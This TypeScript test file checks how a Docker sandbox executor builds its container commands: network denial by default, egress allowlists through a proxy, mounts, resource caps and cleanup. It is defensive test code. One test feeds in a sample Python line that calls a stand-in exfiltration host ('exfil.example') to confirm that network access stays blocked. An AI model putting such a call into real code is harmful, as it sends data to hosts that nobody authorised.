/**
 * Docker executor arg-construction tests. The `run()` wrapper is stubbed, so
 * these assert the EXACT docker command sequences — container create (network
 * gating, bind-mounts), parquet copy-in, stdin data writes, script write,
 * exec — without touching a docker daemon.
 */
import { describe, it, expect, vi, beforeEach } from "vitest";

vi.mock("@/lib/sandbox/docker-utils", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@/lib/sandbox/docker-utils")>();
  return {
    ...actual, // codeDoesRemoteIo / codeNeedsNetwork stay real (pure)
    run: vi.fn(),
    parseExecutionOutput: vi.fn(),
  };
});

// The exec is now STREAMED (spawn) — mock it so no real docker is spawned.
const streamExec = vi.fn(async () => ({ exitCode: 0, aborted: false }));
vi.mock("@/lib/sandbox/stream-exec", () => ({
  streamExec: (...a: unknown[]) => streamExec(...(a as [])),
}));

// Egress setup is exercised by its own proof; here we assert the executor
// wires it: internal network name + proxy env on the analysis container.
const setupEgressNetwork = vi.fn(async (runId: string, _hosts: string[]) => ({
  networkName: `hermetic-egress-${runId}`,
  env: { HTTPS_PROXY: "http://gw:3128", HERMETIC_HTTP_PROXY: "http://gw:3128" },
  proxyLogs: egressProxyLogs,
  teardown: egressTeardown,
}));
const egressTeardown = vi.fn(async () => {});
const egressProxyLogs = vi.fn(async () => "");
vi.mock("@/lib/sandbox/egress", () => ({
  setupEgressNetwork: (...a: unknown[]) => setupEgressNetwork(...(a as [string, string[]])),
}));

import { executeSandbox } from "@/lib/sandbox/docker-executor";
import { run, parseExecutionOutput } from "@/lib/sandbox/docker-utils";
import { resetDaemonMemoryCacheForTests } from "@/lib/sandbox/memory-budget";
import { resetDaemonCpuCacheForTests } from "@/lib/sandbox/hardening";
import { listTarEntryNames } from "@/lib/sandbox/tar-stage";

const mockedRun = vi.mocked(run);
const mockedParse = vi.mocked(parseExecutionOutput);

/** All docker invocations as [subcommand, fullArgs]. */
const calls = () => mockedRun.mock.calls.map(([, args]) => args);
const createCall = () => calls().find((a) => a[0] === "run")!;

beforeEach(() => {
  vi.clearAllMocks();
  // Default `docker info` → "0" → memory probe yields null → uncapped run, so
  // the arg-sequence tests below see the same shape they always did. Same for
  // the CPU probe: null → host-derived --cpus.
  resetDaemonMemoryCacheForTests();
  resetDaemonCpuCacheForTests();
  egressProxyLogs.mockResolvedValue("");
  streamExec.mockResolvedValue({ exitCode: 0, aborted: false });
  mockedRun.mockResolvedValue({ stdout: "0", stderr: "", exitCode: 0 });
  mockedParse.mockResolvedValue({
    success: true,
    results: {},
    chart_data: {},
    images: {},
    datasets: undefined,
    execution_ms: 1,
  });
});

describe("docker executeSandbox", () => {
  it("creates the container with --network none for local-data code", async () => {
    await executeSandbox("a,b\n1,2\n", "import pandas as pd\npd.read_csv('/data/input.csv')");
    const create = createCall();
    expect(create).toContain("--network");
    expect(create[create.indexOf("--network") + 1]).toBe("none");
  });

  it("denies network (--network none) for remote code WITHOUT an egress allowlist (finding M1)", async () => {
    // Deny-by-default: the raw executor must not open docker's default bridge
    // just because the code looks network-y. Only an egress allowlist (or the
    // index.ts egress route) grants network — everything else is --network none.
    await executeSandbox("", "duckdb.sql(\"INSTALL httpfs\"); read_parquet('s3://b/x.parquet')");
    const create = createCall();
    expect(create).toContain("--network");
    expect(create[create.indexOf("--network") + 1]).toBe("none");
  });

  it("bind-mounts a local path read-only and skips the CSV staging", async () => {
    await executeSandbox("", "code", { localMountPath: "/Users/me/data" });
    const create = createCall();
    const vIdx = create.indexOf("-v");
    expect(vIdx).toBeGreaterThan(-1);
    expect(create[vIdx + 1]).toMatch(/^\/Users\/me\/data:.*:ro$/);
    // No input.csv entry in the staging tar when data comes from the mount.
    const stage = mockedRun.mock.calls.find(([, args]) => args[0] === "cp" && args[1] === "-")!;
    const names = listTarEntryNames((stage[2] as { input: Buffer }).input);
    expect(names).not.toContain("input.csv");
    expect(names).toContain("script.py"); // script still staged
  });

  it("docker-cps a materialized parquet into the container", async () => {
    await executeSandbox("", "code", { inputParquetPath: "/tmp/m.parquet" });
    const cp = calls().find((a) => a[0] === "cp");
    expect(cp).toBeDefined();
    expect(cp![1]).toBe("/tmp/m.parquet");
    expect(cp![2]).toMatch(/:\/data\/input\.parquet$/);
  });

  it("stages CSV + script (with the NaN prelude) in ONE tar cp, then executes (perf P2)", async () => {
    await executeSandbox("a,b\n1,2\n", "print('hi')");
    // Exactly one staging spawn — the ~13 per-file `docker exec cat` writes are gone.
    const stages = mockedRun.mock.calls.filter(([, args]) => args[0] === "cp" && args[1] === "-");
    expect(stages).toHaveLength(1);
    expect(calls().some((a) => a.join(" ").includes("cat > /data/"))).toBe(false);
    const archive = (stages[0][2] as { input: Buffer }).input;
    const names = listTarEntryNames(archive);
    expect(names).toContain("input.csv");
    expect(names).toContain("script.py");
    // Execution is streamed (spawn), not a blocking run() call.
    expect(streamExec).toHaveBeenCalledOnce();
    // Script content includes the prelude BEFORE the generated code (byte order
    // inside the tar payload preserves it).
    const text = archive.toString("utf-8");
    expect(text).toContain("print('hi')");
    expect(text.indexOf("print('hi')")).toBeGreaterThan(text.indexOf("input.csv"));
  });

  it("fails fast with the daemon's error when container creation is rejected", async () => {
    // The colima-VM regression: `docker run` rejected (e.g. --cpus above the
    // daemon's NCPU) → run() resolves with a nonzero exit instead of throwing.
    // The executor must surface the daemon's message and stop — NOT march on
    // into execs against a container that never existed ("Unknown execution
    // error" ×4, whole retry budget burned).
    mockedRun.mockImplementation(async (_cmd, args) => {
      if (args[0] === "run")
        return {
          stdout: "",
          stderr:
            "docker: Error response from daemon: Range of CPUs is from 0.01 to 4.00, as there are only 4 CPUs available.",
          exitCode: 125,
        };
      return { stdout: "0", stderr: "", exitCode: 0 };
    });
    const result = await executeSandbox("csv", "code");
    expect(result.success).toBe(false);
    if (!result.success) {
      expect(result.errorKind).toBe("user-config"); // fail fast — no retries
      expect(result.error).toContain("Range of CPUs");
    }
    // Nothing ran against the phantom container...
    expect(streamExec).not.toHaveBeenCalled();
    const execs = calls().filter((a) => a[0] === "exec");
    expect(execs).toHaveLength(0);
    // ...but cleanup still removed the (possibly half-created) name.
    expect(calls().find((a) => a[0] === "rm")).toBeDefined();
  });

  it("always removes the container, even when execution throws", async () => {
    // Reject container CREATION specifically — the `docker info` memory probe
    // may run first and is allowed to no-op (it fails soft to an uncapped run).
    mockedRun.mockImplementation(async (_cmd, args) => {
      if (args[0] === "run") throw new Error("docker daemon down");
      return { stdout: "0", stderr: "", exitCode: 0 };
    });
    const result = await executeSandbox("csv", "code");
    expect(result.success).toBe(false);
    const rm = calls().find((a) => a[0] === "rm");
    expect(rm).toBeDefined();
    expect(rm).toContain("-f");
  });

  it("caps container memory with --memory when the daemon allocation is known", async () => {
    const GiB = 1024 * 1024 * 1024;
    mockedRun.mockImplementation(async (_cmd, args) => {
      if (args[0] === "info") return { stdout: `${4 * GiB}\n`, stderr: "", exitCode: 0 };
      return { stdout: "0", stderr: "", exitCode: 0 };
    });
    await executeSandbox("a,b\n1,2\n", "import pandas as pd");
    const create = createCall();
    const mIdx = create.indexOf("--memory");
    expect(mIdx).toBeGreaterThan(-1);
    expect(create[mIdx + 1]).toBe(`${Math.floor(4 * 1024 * 0.8)}m`);
  });

  it("returns a stopped result (no retry) when the user aborts mid-execution", async () => {
    // The streaming runner resolves with aborted:true when the run's signal fires.
    streamExec.mockResolvedValue({ exitCode: -1, aborted: true });
    const result = await executeSandbox("csv", "code");
    expect(result.success).toBe(false);
    if (!result.success) {
      expect(result.errorKind).toBe("stopped");
      expect(result.error).toMatch(/stopped/i);
    }
    // Container is still torn down.
    expect(calls().find((a) => a[0] === "rm")).toBeDefined();
  });

  it("creates the container with sleep infinity (no lifetime self-kill)", async () => {
    await executeSandbox("a,b\n1,2\n", "print('hi')");
    const create = createCall();
    const sleepIdx = create.indexOf("sleep");
    expect(create[sleepIdx + 1]).toBe("infinity");
  });

  it('network "deny" forces --network none even for remote-IO code (MCP M4)', async () => {
    await executeSandbox("a\n1\n", "import requests\nrequests.get('https://exfil.example/x')", {
      network: "deny",
    });
    const create = createCall();
    expect(create).toContain("--network");
    expect(create[create.indexOf("--network") + 1]).toBe("none");
  });

  it('network "auto" WITHOUT an egress allowlist denies network (deny-by-default, finding M1)', async () => {
    // The raw executor no longer opens docker's default bridge for remote-IO
    // code on its own — network must be earned via an allowlist (the index.ts
    // egress route). Absent one, it is --network none.
    await executeSandbox("a\n1\n", "duckdb.sql(\"select * from 's3://bucket/x.parquet'\")");
    const create = createCall();
    expect(create).toContain("--network");
    expect(create[create.indexOf("--network") + 1]).toBe("none");
  });

  it("allowedEgressHosts: joins the internal network with proxy env; teardown runs (MCP egress)", async () => {
    await executeSandbox("a\n1\n", "duckdb.sql(\"select * from 's3://b/x.parquet'\")", {
      allowedEgressHosts: ["b.s3.amazonaws.com", "s3.amazonaws.com"],
    });
    expect(setupEgressNetwork).toHaveBeenCalledWith(expect.any(String), [
      "b.s3.amazonaws.com",
      "s3.amazonaws.com",
    ]);
    const create = createCall();
    const netIdx = create.indexOf("--network");
    expect(String(create[netIdx + 1])).toMatch(/^hermetic-egress-/);
    expect(create).toContain("-e");
    expect(create).toContain("HERMETIC_HTTP_PROXY=http://gw:3128");
    expect(egressTeardown).toHaveBeenCalled();
  });

  it("network deny wins over allowedEgressHosts (no egress setup at all)", async () => {
    await executeSandbox("a\n1\n", "import requests", {
      network: "deny",
      allowedEgressHosts: ["x.example.com"],
    });
    expect(setupEgressNetwork).not.toHaveBeenCalled();
    const create = createCall();
    expect(create[create.indexOf("--network") + 1]).toBe("none");
  });

  it("egress DENY reclassifies a network failure as a retryable off-source code error", async () => {
    // The proxy blocked a host the code reached that is NOT the data source:
    // that is a code issue (retryable with guidance), not the non-retryable
    // "network" environment fast-fail.
    mockedParse.mockResolvedValue({
      success: false,
      error: "Failed to connect to the data endpoint",
      errorKind: "network",
      execution_ms: 1,
    });
    egressProxyLogs.mockResolvedValue(
      "[egress-proxy] listening :3128\n[egress-proxy] DENY CONNECT census.gov:443\n"
    );
    const result = await executeSandbox("a\n1\n", "import requests", {
      allowedEgressHosts: ["b.s3.amazonaws.com"],
    });
    expect(result.success).toBe(false);
    if (!result.success) {
      expect(result.error).toContain("census.gov:443");
      expect(result.error).toMatch(/NOT the connected data source/i);
      // reclassified: the fast-fail errorKind is dropped so the run retries.
      expect(result.errorKind).toBeUndefined();
    }
  });

  it("a network failure with no DENY stays fast-fail but attaches the proxy log", async () => {
    mockedParse.mockResolvedValue({
      success: false,
      error: "Could not establish connection",
      errorKind: "network",
      execution_ms: 1,
    });
    egressProxyLogs.mockResolvedValue("[egress-proxy] error: upstream connect timed out\n");
    const result = await executeSandbox(
      "a\n1\n",
      "duckdb.sql(\"select * from 's3://b/x.parquet'\")",
      {
        allowedEgressHosts: ["b.s3.amazonaws.com"],
      }
    );
    expect(result.success).toBe(false);
    if (!result.success) {
      // genuine unreachable source — still fast-fails...
      expect(result.errorKind).toBe("network");
      // ...but now carries the gateway proxy's own log for diagnosis.
      expect(result.execDiag ?? "").toContain("upstream connect timed out");
    }
  });

  it("applies container hardening flags to every run (finding M10)", async () => {
    await executeSandbox("a,b\n1,2\n", "print('hi')");
    const create = createCall();
    expect(create).toContain("--pids-limit");
    expect(create).toContain("--cpus");
    expect(create).toContain("--cap-drop");
    expect(create[create.indexOf("--cap-drop") + 1]).toBe("ALL");
    // no-new-privileges was removed: it makes execve of python3 fail against
    // this image (see hardening.ts). It must NOT come back without a live-
    // container test proving the container still starts.
    expect(create).not.toContain("no-new-privileges");
  });
});
